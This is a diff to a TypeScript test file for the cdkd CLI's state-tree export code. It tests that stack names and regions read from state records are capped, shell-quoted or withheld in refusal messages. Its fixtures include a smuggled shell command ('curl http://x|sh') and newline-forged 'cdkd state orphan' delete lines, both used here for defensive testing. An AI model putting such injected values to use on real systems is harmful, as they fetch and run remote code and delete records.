@@ -1,4 +1,6 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vite-plus/test';
+import { readAtKeyRegion } from '../_state-read-double.js';
+import { STACK_REF_MAX_CODE_POINTS } from '../../../src/utils/display-safe.js';
 import {
   applyImportOverlayForPhase2,
   buildCdkdStateStackTree,
@@ -2436,7 +2438,10 @@ function makeStateBackendMock(
     async getState(stackName: string, region: string) {
       const s = states[`${stackName}|${region}`];
       if (!s) return null;
-      return { state: s, etag: '"mock"', migrationPending: undefined };
+      // Through the shared mirror, not a literal record: `getState` adopts the
+      // KEY's region and reports a divergent body separately (#3328), and the
+      // walker's region-mismatch refusal reads the REPORT.
+      return readAtKeyRegion(s, region);
     },
   } as unknown as Pick<S3StateBackend, 'getState'>;
 }
@@ -2564,14 +2569,257 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     const backend = makeStateBackendMock({
       'Root|us-east-1': root,
       // Backend lookup happens on the parent's region, so register the
-      // child under `(Root~Child, us-east-1)`. The mismatch surfaces only
-      // when the walker compares `childResult.state.region` (`us-west-2`)
-      // against the walker's `region` argument (`us-east-1`).
+      // child under `(Root~Child, us-east-1)`. Since go-to-k/cdkd#3328 the
+      // mismatch surfaces through `getState`'s `divergentBodyRegion` report
+      // rather than through `childResult.state.region`, which the read
+      // normalizes to the key's — the double mirrors that (`readAtKeyRegion`),
+      // so this record still reaches the walker as a divergence.
       'Root~Child|us-east-1': child,
     }) as S3StateBackend;
     await expect(buildCdkdStateStackTree('Root', 'us-east-1', backend)).rejects.toThrow(
       /region mismatch.*state\.region='us-west-2'.*walked against region='us-east-1'/s
     );
+  });
+
+  it('CAPS the divergent region it renders in that refusal (go-to-k/cdkd#3328)', async () => {
+    // `safeSegment` renders a value straight off a state record, and a
+    // `region` field is unvalidated body content of any length — so an
+    // uncapped render pushes the refusal's own explanation off the screen.
+    // This was the last uncapped rendering of that value; the read side's warn
+    // and the destroy refusal both bound it.
+    const root = makeState({
+      stackName: 'Root',
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const child = makeState({
+      stackName: 'Root~Child',
+      region: 'z'.repeat(5000),
+      resources: {},
+      parentStack: 'Root',
+      parentLogicalId: 'Child',
+    });
+    const backend = makeStateBackendMock({
+      'Root|us-east-1': root,
+      'Root~Child|us-east-1': child,
+    }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree('Root', 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+    const message = (thrown as Error).message;
+
+    // Still the refusal, and it still shows enough to recognise the value.
+    expect(message).toContain('region mismatch');
+    // `displayIdent`'s marker shape: it states the COUNT and is space-separated,
+    // so it cannot be mistaken for content the way a bare `[cut]` can — a
+    // planted name ENDING in `[cut]` renders identically to a truncated one.
+    expect(message).toContain(`[cut: ${5000 - STACK_REF_MAX_CODE_POINTS} more characters withheld]`);
+    // Against the CONSTANT: an arbitrary length bound would pass a cap widened
+    // to any round number.
+    expect(message).toContain('z'.repeat(STACK_REF_MAX_CODE_POINTS));
+    expect(message).not.toContain('z'.repeat(STACK_REF_MAX_CODE_POINTS + 1));
+  });
+
+  it.each([
+    [
+      'a shell metacharacter',
+      "A'; curl http://x|sh; echo '",
+      (m: string) => {
+        // SHELL-QUOTED, so the pasteable line cannot break out of its argument.
+        expect(m).not.toMatch(/cdkd state orphan [^'\n]*;/);
+        expect(m).toContain("cdkd state orphan 'Root~A'\\''; curl http://x|sh; echo '\\'''");
+      },
+    ],
+    [
+      'a TRAILING SPACE, which renders as a healthy sibling',
+      'A ',
+      (m: string) => {
+        // WITHHELD: `displaySafe` trims, so `Root~A ` renders as `Root~A` and a
+        // substituted command would delete the intact record of that name.
+        expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
+        expect(m).toContain('cdkd state list --long');
+        expect(m).not.toMatch(/cdkd state orphan 'Root~A'/);
+      },
+    ],
+    [
+      'a NEWLINE, which forges a line around the delete command',
+      'A\n  cdkd state orphan Healthy',
+      (m: string) => {
+        expect(m.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))).toBe(
+          false
+        );
+      },
+    ],
+  ])(
+    'never hands over a pasteable orphan command built from a logical id carrying %s (go-to-k/cdkd#3328)',
+    async (_, logicalId, assertOn) => {
+      // `walkCdkdStateStackTree` mints each child's stack name as
+      // `${parent}~${logicalId}` from `Object.keys(state.resources)` — body
+      // content anyone with `s3:PutObject` on one key chooses — and RECURSES,
+      // so from depth 2 the `stackName` this refusal names is itself derived.
+      // That is the reachable shape: at depth 1 the name is the caller's own,
+      // so a single-level fixture cannot exercise the command at all.
+      const hostileChild = `Root~${logicalId}`;
+      const root = makeState({
+        stackName: 'Root',
+        region: 'us-east-1',
+        resources: { [logicalId]: { resourceType: 'AWS::CloudFormation::Stack' } },
+      });
+      // The hostile-named child EXISTS and itself lists a nested row whose
+      // record does not, so the refusal fires one level down with the derived
+      // name as its subject.
+      const child = makeState({
+        stackName: hostileChild,
+        region: 'us-east-1',
+        resources: { Grandchild: { resourceType: 'AWS::CloudFormation::Stack' } },
+      });
+      const backend = makeStateBackendMock({
+        'Root|us-east-1': root,
+        [`${hostileChild}|us-east-1`]: child,
+      }) as S3StateBackend;
+
+      const thrown = await buildCdkdStateStackTree('Root', 'us-east-1', backend).catch(
+        (e: unknown) => e
+      );
+
+      const message = (thrown as Error).message;
+      expect(message).toContain('missing nested-child');
+      assertOn(message);
+    }
+  );
+
+  /**
+   * THE INSTRUMENT, after three review rounds each found another site.
+   *
+   * go-to-k/cdkd#3328's rounds 3, 4 and 5 hardened six renderings of a
+   * record-derived stack name in this file, one at a time, and each round found
+   * the next by accident — round 5's own FIXTURE was what surfaced the sixth,
+   * because a hostile name hit `cdkd2cfnStackName`'s refusal before reaching
+   * the block the case was written for. A seventh would have been found the
+   * same way or not at all, so this is a check rather than a seventh sentence.
+   *
+   * ITS LIMIT, stated because naming these bindings does not close their class:
+   * a value crossing a helper's RETURN (`const targetRegion = await
+   * pickStackRegion(...)`) has no carrier on its right-hand side, so nothing
+   * here can DERIVE it — the two below were added by hand after a review found
+   * them raw. When adding a helper that returns a record-derived value, add its
+   * binding here too; the derived half covers only values read off a receiver.
+   *
+   * WHAT IT DOES NOT COVER, named so this is not read as "the record-derived
+   * class is closed": the record's `physicalId` / `properties` / `attributes`
+   * are body content at the same trust boundary and are rendered raw at ~40
+   * sites, including the plan printed directly above the destructive
+   * confirmation — go-to-k/cdkd#3375. That population needs a different
+   * instrument (a `properties` bag is an object, not an identifier), which is
+   * why it is a separate issue rather than a wider list here.
+   *
+   * SCOPE, stated because it is narrower than "every value in every message":
+   * only the names `walkCdkdStateStackTree` MINTS from a record's own
+   * `resources` keys (`${parent}~${logicalId}`, applied recursively) and the
+   * fields carried beside them. Those are chosen by anyone able to write one
+   * state key. A template `logicalId` or a CLI-supplied `resolvedStackName` sits
+   * at a different trust boundary and is deliberately NOT in the population —
+   * that half is go-to-k/cdkd#3371.
+   */
+  it('renders no record-derived name RAW in any message (go-to-k/cdkd#3328)', async () => {
+    const { readFileSync } = await import('node:fs');
+    const { fileURLToPath } = await import('node:url');
+    const source = readFileSync(
+      fileURLToPath(new URL('../../../src/cli/commands/export.ts', import.meta.url)),
+      'utf-8'
+    );
+
+    // Derived from the CODE in BOTH directions: the receivers this file reads a
+    // minted name off, AND the property names that name is CARRIED under.
+    // `walkCdkdStateStackTree` mints `${parent}~${logicalId}`; the value then
+    // travels node `.stackName` -> `PerStackImportNode.cdkdStackName` ->
+    // `PerStackPlan.cdkdName` -> `importedStacks[].cdkdStackName`, and the first
+    // cut of this fence watched only the FIRST hop — which left a reachable,
+    // MULTI-LINE raw rendering unwatched while looking like the class was
+    // covered (review round 6). A fence that watches a subset of its stated
+    // class is worse than none.
+    const carriers = ['stackName', 'region', 'cdkdStackName', 'cdkdName'];
+    const receivers = [
+      ...new Set(
+        [...source.matchAll(new RegExp(`\\b(\\w+)\\.(?:${carriers.join('|')})\\b`, 'g'))].map(
+          (m) => m[1] as string
+        )
+      ),
+    ];
+    // NO allow-list: a new receiver joins by being WRITTEN. The exclusions are
+    // the two bags that are not tree nodes — `options` / `deps` / `opts` style
+    // parameter objects carrying a CLI-supplied name, which is go-to-k/cdkd#3371's
+    // population and a different trust boundary.
+    const notNodes = new Set(['options', 'opts', 'deps', 'input', 'stackInfo', 'setup']);
+    const watched = receivers.filter((name) => !notNodes.has(name));
+    // A FLOOR, so a regex that silently stopped matching cannot pass here, and
+    // an upper sanity bound so an over-broad match is visible too.
+    expect(watched.length).toBeGreaterThanOrEqual(5);
+
+    const identifiers = [
+      ...watched.flatMap((r) => carriers.map((c) => `${r}.${c}`)),
+      // The BARE bindings the same value is destructured or bound into. A
+      // property that is not one of the four carriers is still the same value
+      // when it is READ OFF a record — `node.state.parentStack` is the extreme
+      // case, an un-minted state-body field with no shape constraint at all,
+      // and it was raw while the first two cuts of this fence passed (review
+      // round 7).
+      'childStackName',
+      'cdkdName',
+      'parentStackName',
+      'row.childStackName',
+      'node.state.parentStack',
+      // A record-derived value crossing a helper's RETURN into a local: both of
+      // these are `pickStackRegion`'s answer, whose LEGACY branch returns the
+      // record BODY's `region` — `typeof === 'string'` its only constraint, so
+      // arbitrary UTF-8 — and they render into two DESTRUCTIVE confirmation
+      // prompts (review round 8).
+      'targetRegion',
+      'rootRegion',
+    ];
+    const raw = identifiers.flatMap((id) =>
+      [...source.matchAll(new RegExp(`\\$\\{${id.replace('.', '\\.')}\\}`, 'g'))]
+        .map((m) => ({ id, at: m.index ?? 0 }))
+        // A template literal used as a DATA value rather than as a message:
+        // `childStackName: \`${parentStackName}~${logicalId}\`` MINTS the name
+        // and the upload key `stackName: \`${plan.cdkdName}__nested__...\`` is an
+        // S3 object name. Neither is something a terminal renders, and
+        // sanitizing either would change the VALUE rather than its rendering.
+        // Anchored on the property assignment, so it exempts only a literal
+        // that IS the value of a `*[Ss]tackName` key.
+        .filter(({ at }) => !/\b\w*[Ss]tackName: `[^`]*$/.test(source.slice(Math.max(0, at - 80), at)))
+        .map(({ id, at }) => `${id} at offset ${at}`)
+    );
+
+    expect(raw, 'a record-derived name is interpolated without a sanitizer').toEqual([]);
+
+    // The INDIRECTION the literal match cannot see: a list of such names
+    // reduced to a string and interpolated as one. `remainingSummary` was
+    // exactly that — `perStackPlans.slice(i).map((p) => p.cdkdName).join(', ')`
+    // straight into a throw — and it passed both earlier cuts of this fence.
+    // A WINDOW around each `.join(`, not a parsed map/join pair: the shapes in
+    // this file wrap across lines, carry a `.slice()` between them, and put
+    // parentheses inside the callback's template literal, all of which a
+    // structural regex got wrong in three different ways. The window is crude
+    // and it is what the assertion's non-vacuity floor keeps honest.
+    const joinWindows = [...source.matchAll(/\.join\(/g)].map(({ index }) =>
+      source.slice(Math.max(0, (index ?? 0) - 220), index ?? 0)
+    );
+    // The SAME callback parameter name serves both trust boundaries here (`s`
+    // is a synth stack in one place and an imported record in another), so the
+    // discriminator is what the `.map` runs OVER. `result.stacks` is the Cloud
+    // Assembly's own list — go-to-k/cdkd#3371's population.
+    const carrierJoins = joinWindows
+      .filter((w) => !w.includes('result.stacks'))
+      .filter((w) => carriers.some((c) => new RegExp(`\\.${c}\\b`).test(w)));
+    // Non-vacuity: the shape exists in this file, so an assertion over an empty
+    // set would be asserting nothing.
+    expect(carrierJoins.length).toBeGreaterThanOrEqual(2);
+    expect(
+      carrierJoins.filter((w) => !/safeSegment\(|safeDetail\(/.test(w)),
+      'a list of record-derived names is joined into a message without a sanitizer'
+    ).toEqual([]);
   });
 
   it('skips the root-state fetch when prefetchedRootState is supplied', async () => {
@@ -3540,6 +3788,58 @@ describe('buildPerStackImportNodes (issue #464 PR B2)', () => {
     expect(nodes.size).toBe(1);
     expect(nodes.get('Root')!.template).toBe(rootTemplate);
     expect(nodes.get('Root')!.templateFormat).toBe('json');
+  });
+
+  it('never renders a record-derived name RAW in the missing-asset-path refusal (go-to-k/cdkd#3328)', () => {
+    // The second of the three sites that suggested `cdkd state orphan <name>`
+    // built from `${parent}~${logicalId}`. This one rendered the name with no
+    // sanitizing at all, so a newline in a logical id forged whole lines
+    // around a DELETE command, and the CSI sequence below could rewrite them.
+    const hostile = 'Child\n  cdkd state orphan Healthy --yes';
+    const tree: CdkdStateStackTree = {
+      stackName: 'Root',
+      region: 'us-east-1',
+      state: makeState({
+        stackName: 'Root',
+        region: 'us-east-1',
+        resources: { [hostile]: { resourceType: 'AWS::CloudFormation::Stack' } },
+      }),
+      nestedChildren: new Map([
+        [
+          hostile,
+          {
+            stackName: `Root~${hostile}`,
+            region: 'us-east-1',
+            state: makeState({ stackName: `Root~${hostile}`, region: 'us-east-1' }),
+            nestedChildren: new Map(),
+          },
+        ],
+      ]),
+    };
+    const rootTemplate = {
+      Resources: { [hostile]: { Type: 'AWS::CloudFormation::Stack' } },
+    };
+
+    // No path index entry for the child, so the refusal fires.
+    const thrown = (() => {
+      try {
+        buildPerStackImportNodes('Root', rootTemplate, {}, 'json', tree);
+        return undefined;
+      } catch (e: unknown) {
+        return e;
+      }
+    })();
+
+    const message = (thrown as Error).message;
+    expect(message).toContain("no Metadata['aws:asset:path']");
+    // No line of the refusal may BE a runnable delete, which is what the raw
+    // newline bought.
+    expect(
+      message.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))
+    ).toBe(false);
+    // And the suggested command is withheld, because the name does not render
+    // exactly once sanitized.
+    expect(message).toContain('cdkd state orphan <stack> --stack-region <region>');
   });
 
   it('loads a child template via the nested-template path index', () => {
